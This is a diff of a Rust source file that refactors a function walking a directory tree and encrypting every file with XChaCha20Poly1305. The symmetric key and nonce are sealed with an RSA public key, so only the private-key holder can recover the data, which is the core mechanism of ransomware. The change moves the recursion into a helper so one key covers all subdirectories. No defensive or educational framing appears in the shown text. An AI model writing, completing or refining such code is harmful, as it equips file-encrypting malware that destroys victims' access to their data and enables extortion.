@@ -1,7 +1,7 @@
 use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
-use anyhow::Context;
+use anyhow::{Context, Result};
 use chacha20poly1305::aead::OsRng;
 use chacha20poly1305::aead::stream::EncryptorBE32;
 use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
@@ -52,23 +52,17 @@ fn encrypt_file(
     Ok(())
 }
 
-pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut ThreadRng) -> anyhow::Result<()> {
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 19];
-    OsRng.fill_bytes(&mut key);
-    OsRng.fill_bytes(&mut nonce);
-
-    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)
-        .with_context(|| "Failed to encrypt the key")?;
-    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
-        .with_context(|| "Failed to encrypt the nonce")?;
-
-    let aead = XChaCha20Poly1305::new(key.as_ref().into());
-
+fn encrypt_dir_recursive(
+    path: &Path,
+    aead: &XChaCha20Poly1305,
+    nonce: &[u8],
+    encrypted_key: &[u8],
+    encrypted_nonce: &[u8],
+) -> Result<()> {
     for entry in path.read_dir()? {
         let entry = entry?;
         if entry.file_type()?.is_dir() {
-            encrypt_everything(&entry.path(), public_key, rng)?;
+            encrypt_dir_recursive(&entry.path(), &aead, nonce, encrypted_key, encrypted_nonce)?;
             continue;
         }
 
@@ -94,14 +88,33 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
         if let Err(e) = encrypt_file(
             &mut file,
             &new_path,
-            encrypted_key.as_slice(),
-            encrypted_nonce.as_slice(),
+            encrypted_key,
+            encrypted_nonce,
             aead.clone(),
-            nonce.as_ref(),
+            nonce,
         ) {
             eprintln!("Failed to encrypt a file {:?}: {}", entry.path(), e);
             continue;
         };
     }
+
+    Ok(())
+}
+
+pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut ThreadRng) -> Result<()> {
+    let mut key = [0u8; 32];
+    let mut nonce = [0u8; 19];
+    OsRng.fill_bytes(&mut key);
+    OsRng.fill_bytes(&mut nonce);
+
+    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)
+        .with_context(|| "Failed to encrypt the key")?;
+    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
+        .with_context(|| "Failed to encrypt the nonce")?;
+
+    let aead = XChaCha20Poly1305::new(key.as_ref().into());
+
+    encrypt_dir_recursive(path, &aead, &nonce, &encrypted_key, &encrypted_nonce)?;
+
     Ok(())
 }
